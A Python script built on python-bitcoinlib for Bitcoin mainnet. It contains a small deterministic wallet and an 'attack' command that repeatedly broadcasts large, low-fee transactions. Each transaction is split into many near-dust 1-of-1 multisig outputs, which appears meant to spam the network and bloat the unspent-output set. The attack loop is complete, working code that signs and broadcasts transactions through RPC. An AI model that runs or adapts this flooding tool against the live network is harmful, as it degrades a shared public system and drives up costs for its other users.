#!/usr/bin/python3

# Distributed under the MIT/X11 software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.

import argparse
import collections
import logging
import os
import pickle
import random
import struct
import sys
import time

import bitcoin
import bitcoin.rpc
from bitcoin.core import (x, lx, b2x, b2lx, str_money_value, COIN,
                          COutPoint, CTxIn, CTxOut, CTransaction,
                          Hash, Hash160)
from bitcoin.core.script import (OP_0, OP_DUP, OP_HASH160, OP_EQUALVERIFY, OP_CHECKSIG, OP_CHECKMULTISIG,
                                 CScript, SignatureHash, SIGHASH_ALL)
from bitcoin.core.scripteval import VerifyScript
from bitcoin.wallet import CBitcoinAddress, CBitcoinSecret

netname = 'mainnet'
bitcoin.SelectParams(netname)

class Wallet:
    """Simple little deterministic wallet

    Here because python-bitcoinlib doesn't have one yet.

    WARNING: this code sucks

    keypairs           - dict of scriptPubKey:CBitcoinSecret
    outpoints_by_block - dict of block_hash:set of COutPoint
    unspent_txouts     - dict of COutPoint:CTxOut
    seed_birthday      - unix time of when the seed was created
    known_block_hashes - list of known block hashes to detect reorgs
    """

    def __init__(self, hex_seed, filename, seed_birthday=None):
        self.filename = filename
        self.seed = x(hex_seed)
        if len(self.seed) != 32:
            raise ValueError('seed not 32 bytes')

        self.keypairs = {}
        self.outpoints_by_block = {}
        self.unspent_txouts = {}
        if seed_birthday is None:
            seed_birthday = time.time() - 4*24*60*60
        self.seed_birthday = seed_birthday

        self.known_blocks = []

        for i in range(5000):
            self.make_multisig(i)
            self.make_paytopubkeyhash(i)

    def __getstate__(self):
        state = self.__dict__.copy()
        state['keypairs'] = {}

        # convert secret keys to bytes - they can't be pickled directly
        for pubkey, seckey in self.keypairs.items():
            state['keypairs'][pubkey] = seckey.to_secret_bytes()

        return state

    def __setstate__(self, state):
        self.__dict__.update(state)

        # convert text secrets back to CBitcoinSecrets
        for pubkey, seckey in self.keypairs.items():
            self.keypairs[pubkey] = CBitcoinSecret.from_secret_bytes(seckey)

    @staticmethod
    def load(filename):
        with open(filename, 'rb') as fd:
            self = pickle.load(fd)
        self.filename = filename
        return self

    def save(self):
        if os.path.exists(self.filename):
            os.rename(self.filename, self.filename + '.bak.%d' % time.time())
        with open(self.filename, 'wb') as fd:
            pickle.dump(self, fd)

    def make_multisig(self, n = None):
        if n is None:
            n = random.randrange(0, len(self.keypairs))

        secret_bytes = Hash(self.seed + struct.pack('>L', n))
        secret_key = CBitcoinSecret.from_secret_bytes(secret_bytes)

        # 1-of-1 CHECKMULTISIG scriptPubKey's
        scriptPubKey = CScript([1, secret_key.pub, 1, OP_CHECKMULTISIG])

        self.keypairs[scriptPubKey] = secret_key

        return scriptPubKey

    def make_paytopubkeyhash(self, n = None):
        if n is None:
            n = random.randrange(0, len(self.keypairs))

        secret_bytes = Hash(self.seed + struct.pack('>L', n))
        secret_key = CBitcoinSecret.from_secret_bytes(secret_bytes)

        # pay-to-pubkeyhash
        scriptPubKey = CScript([OP_DUP, OP_HASH160, Hash160(secret_key.pub), OP_EQUALVERIFY, OP_CHECKSIG])

        self.keypairs[scriptPubKey] = secret_key

        return scriptPubKey

    def scan_tx(self, tx, block_hash=None):
        tx_hash = tx.get_hash()

        #logging.debug('Checking tx %s for transactions' % b2lx(tx_hash))

        num_found = 0
        # Remove spent
        for txin in tx.vin:
            try:
                del self.unspent_txouts[txin.prevout]
            except KeyError:
                continue
            logging.info('Outpoint %r spent' % txin.prevout)

        # Add unspent
        for (i, txout) in enumerate(tx.vout):
            if txout.scriptPubKey in self.keypairs:
                outpoint = COutPoint(tx_hash, i)
                if block_hash is not None:
                    block_txout_set = self.outpoints_by_block.setdefault(block_hash, set())
                    block_txout_set.add((outpoint, txout))
                self.unspent_txouts[outpoint] = txout

                logging.info('Found txout: %r -> %r' % (outpoint, txout))
                num_found += 1

        return num_found

    def scan_block(self, block):
        """Scan a new block for txouts to us"""
        block_hash = block.get_hash()
        num_found = 0
        for tx in block.vtx:
            num_found += self.scan_tx(tx, block_hash)

        return num_found

    def find_confirmed_txouts(self, rpc, starting_height=2**32):
        """Find new confirmed transaction outputs"""

        # Detect reorgs first
        if self.known_blocks:
            while len(self.known_blocks) > starting_height \
                  or self.known_blocks[-1] != rpc.getblockhash(len(self.known_blocks)-1):

                reorged_block_hash = self.known_blocks.pop()

                # Top block hash not longer valid, remove it and all related txouts
                if reorged_block_hash in self.outpoints_by_block:
                    logging.info('Block %s no longer exists, removing %d transactions' %
                            (b2lx(reorged_block_hash), len(self.outpoints_by_block[reorged_block_hash])))
                    del self.outpoints_by_block[reorged_block_hash]

        # When initializing the wallet for the first time quickly scan until we
        # reach the seed birthday
        if not len(self.known_blocks):
            last_nTime = 0
            stride = 1000
            while last_nTime < self.seed_birthday:
                self.known_blocks.extend([b'\x00'*32] * stride)

                if len(self.known_blocks) >= rpc.getblockcount():
                    break

                last_block_hash = rpc.getblockhash(len(self.known_blocks))
                last_nTime = rpc.getblock(last_block_hash).nTime

            self.known_blocks = self.known_blocks[:-stride]


        # Get new blocks
        while len(self.known_blocks) <= rpc.getblockcount():
            new_block_hash = rpc.getblockhash(len(self.known_blocks))
            new_block = rpc.getblock(new_block_hash)

            num_found = self.scan_block(new_block)
            logging.info('New block %s at height %d; found %d txouts' %
                         (b2lx(new_block_hash), len(self.known_blocks), num_found))

            self.known_blocks.append(new_block_hash)


    def sign_txout(self, tx, n):
        pass


def init_command(args):
    wallet = Wallet(args.seed, args.wallet)
    wallet.save()


def scan_command(args):
    args.wallet.find_confirmed_txouts(args.rpc, args.starting_height)
    args.wallet.save()
    logging.info('Done scan, we have %d total txouts' % len(args.wallet.unspent_txouts))

def getnewaddress_command(args):
    fund_addr = CBitcoinAddress.from_scriptPubKey(args.wallet.make_paytopubkeyhash())
    args.wallet.save()
    print('Pay to %s to fund your wallet' % fund_addr)

def attack_command(args):
    #args.starting_height = 2**32-1
    #scan_command(args)
    fd = open('sent-txs','a')

    for txhash in args.rpc.getrawmempool():
        txhash = lx(txhash)
        tx = args.rpc.getrawtransaction(txhash)
        args.wallet.scan_tx(tx)

    args.fee_per_kb = int(args.fee_per_kb * COIN)

    # deque of transaction outputs, (COutPoint, CTxOut), that we have available
    # to spend. We use these outputs in order, oldest first.
    available_txouts = collections.deque()

    # gather up existing outputs
    total_funds = 0
    for outpoint, txout in args.wallet.unspent_txouts.items():
        total_funds += txout.nValue
        available_txouts.append((outpoint, txout))

    size_sent = 0
    while available_txouts:
        logging.info('Attacking! Sent %d bytes total, Funds left: %s in %d txouts' %
                     (size_sent, str_money_value(total_funds), len(available_txouts)))

        tx = CTransaction()

        # Gather up txouts until we have enough funds in to pay the fees on a
        # target-sized tx as well as the non-dust outputs.
        sum_value_in = 0

        # Assuming the whole tx is CTxOut's, each one is 46 bytes (1-of-1
        # CHECKMULTISIG) and the value out needs to be at least 1000 satoshis.
        avg_txout_size = 46 #25+1+8
        num_txouts = args.target_tx_size // avg_txout_size
        min_value_out = 10000
        sum_min_value_out = num_txouts * min_value_out

        fees = (args.target_tx_size/1000) * args.fee_per_kb

        inputs = {}
        tx_size = len(tx.serialize())
        dummy_scriptSig = CScript([b'\x00'*74])
        while (sum_value_in < fees + sum_min_value_out
               and tx_size < args.target_tx_size/2 # don't devote more than half the tx to inputs
               and available_txouts):
            outpoint, txout = available_txouts.popleft()

            try:
                args.rpc.gettxout(outpoint)
            except IndexError:
                continue

            inputs[outpoint] = txout
            sum_value_in += txout.nValue

            # The CTxIn has a dummy signature so size calculations will be right
            txin = CTxIn(outpoint, dummy_scriptSig)
            tx.vin.append(txin)
            tx_size += len(txin.serialize())

        total_funds -= sum_value_in

        # Recalculate number of txouts we'll have now that we've added the
        # txins. Of course, this will leave the actual value per txout a bit
        # high, but whatever.
        num_txouts = int(min((args.target_tx_size-len(tx.serialize())) / avg_txout_size,
                             (sum_value_in - fees) / min_value_out))

        # Split the funds out evenly among all transaction outputs.
        per_txout_value = (sum_value_in - fees) // num_txouts
        for i in range(num_txouts):
            scriptPubKey = args.wallet.make_multisig()
            txout = CTxOut(per_txout_value, scriptPubKey)
            tx.vout.append(txout)

        # Sign the transaction
        for (i, txin) in enumerate(tx.vin):
            prevout_scriptPubKey = inputs[txin.prevout].scriptPubKey
            sighash = SignatureHash(prevout_scriptPubKey, tx, i, SIGHASH_ALL)
            seckey = args.wallet.keypairs[prevout_scriptPubKey]
            sig = seckey.sign(sighash) + bytes([SIGHASH_ALL])

            if prevout_scriptPubKey[-1] == OP_CHECKMULTISIG:
                txin.scriptSig = CScript([OP_0, sig])

            elif prevout_scriptPubKey[-1] == OP_CHECKSIG and prevout_scriptPubKey[-2] == OP_EQUALVERIFY:
                txin.scriptSig = CScript([sig, seckey.pub])

            VerifyScript(txin.scriptSig, prevout_scriptPubKey, tx, i)

        # Add the new txouts to the list of available txouts
        tx_hash = tx.get_hash()
        sum_value_out = 0
        for i, txout in enumerate(tx.vout):
            outpoint = COutPoint(tx_hash, i)
            available_txouts.append((outpoint, txout))
            sum_value_out += txout.nValue

        total_funds += sum_value_out

        actual_fees = sum_value_in - sum_value_out
        serialized_tx = tx.serialize()
        logging.debug('Sending tx %s\n'
           '           value in: %s, value out: %s, fees: %s, fees/KB: %s\n'
           '           size: %d, # of inputs: %d, # of outputs: %d, txout.nValue: %s' %
                      (b2lx(tx_hash), str_money_value(sum_value_in), str_money_value(sum_value_out),
                       str_money_value(actual_fees),
                       str_money_value(actual_fees/(len(serialized_tx)/1000)),
                       len(serialized_tx), len(tx.vin), len(tx.vout), per_txout_value))
        size_sent += len(serialized_tx)

        #print(b2x(serialized_tx))
        #args.wallet.save()
        try:
            args.rpc.sendrawtransaction(tx)
            fd.write(b2x(serialized_tx) + '\n')
            fd.flush()
        except bitcoin.rpc.JSONRPCException as exp:
            print(b2x(tx.serialize()))
            #import pdb; pdb.set_trace()

        time.sleep(random.randrange(30,60))


def recover_command(args):
    args.fee_per_kb = int(args.fee_per_kb * COIN)
    addr = CBitcoinAddress(args.addr)

    tx = CTransaction()

    sum_value_in = 0
    dummy_scriptSig = CScript([b'\x00'*74])
    inputs = {}
    for outpoint, txout in tuple(args.wallet.unspent_txouts.items())[0:500]:
        sum_value_in += txout.nValue
        tx.vin.append(CTxIn(outpoint, dummy_scriptSig))
        inputs[outpoint] = txout

    tx.vout.append(CTxOut(-1, addr.to_scriptPubKey()))

    fees = int((len(tx.serialize())/1000) * args.fee_per_kb)

    tx.vout[0].nValue = sum_value_in - fees

    # Sign the transaction
    for (i, txin) in enumerate(tx.vin):
        prevout_scriptPubKey = inputs[txin.prevout].scriptPubKey
        sighash = SignatureHash(prevout_scriptPubKey, tx, i, SIGHASH_ALL)
        seckey = args.wallet.keypairs[prevout_scriptPubKey]
        sig = seckey.sign(sighash) + bytes([SIGHASH_ALL])

        if prevout_scriptPubKey[-1] == OP_CHECKMULTISIG:
            txin.scriptSig = CScript([OP_0, sig])

        elif prevout_scriptPubKey[-1] == OP_CHECKSIG and prevout_scriptPubKey[-2] == OP_EQUALVERIFY:
            txin.scriptSig = CScript([sig, seckey.pub])

        VerifyScript(txin.scriptSig, prevout_scriptPubKey, tx, i)

    print(b2x(tx.serialize()))


parser = argparse.ArgumentParser()
parser.add_argument('--wallet', action='store',
    default=None,
    help='Wallet file')

subparsers = parser.add_subparsers(title='commands')

parser_init = subparsers.add_parser('init', help='Initialize wallet')
parser_init.add_argument('seed', action='store',
                         type=str,
                         help='32-byte hex seed')
parser_init.set_defaults(func=init_command)

parser_scan = subparsers.add_parser('scan', help='Scan blockchain for new confirmed txouts')
parser_scan.add_argument('starting_height', action='store',
                         type=int,
                         default=2**32-1, nargs='?',
                         help='height to start scanning at')
parser_scan.set_defaults(func=scan_command)

parser_getnewaddress = subparsers.add_parser('getnewaddress', help='Get new address')
parser_getnewaddress.set_defaults(func=getnewaddress_command)

parser_attack = subparsers.add_parser('attack', help='Run attack')
parser_attack.add_argument('--fee-per-kb', action='store',
                           dest='fee_per_kb',
                           type=float,
                           default=0.00011,
                           help='fee per KB')
parser_attack.add_argument('--target-tx-size', action='store',
                           dest='target_tx_size',
                           type=int,
                           default=90000,
                           help='target transaction size')
parser_attack.set_defaults(func=attack_command)

parser_recover = subparsers.add_parser('recover', help='Recover funds')
parser_recover.add_argument('--fee-per-kb', action='store',
                            dest='fee_per_kb',
                            type=float,
                            default=0.001,
                            help='fee per KB')
parser_recover.add_argument('addr', action='store',
                         type=str,
                         help='address to send funds to')
parser_recover.set_defaults(func=recover_command)


args = parser.parse_args()


args.rpc = bitcoin.rpc.Proxy()

logging.root.setLevel(logging.DEBUG)

if args.wallet is None:
    args.wallet = 'wallet-%s.dat' % netname
if os.path.exists(args.wallet):
    args.wallet = Wallet.load(args.wallet)

args.func(args)
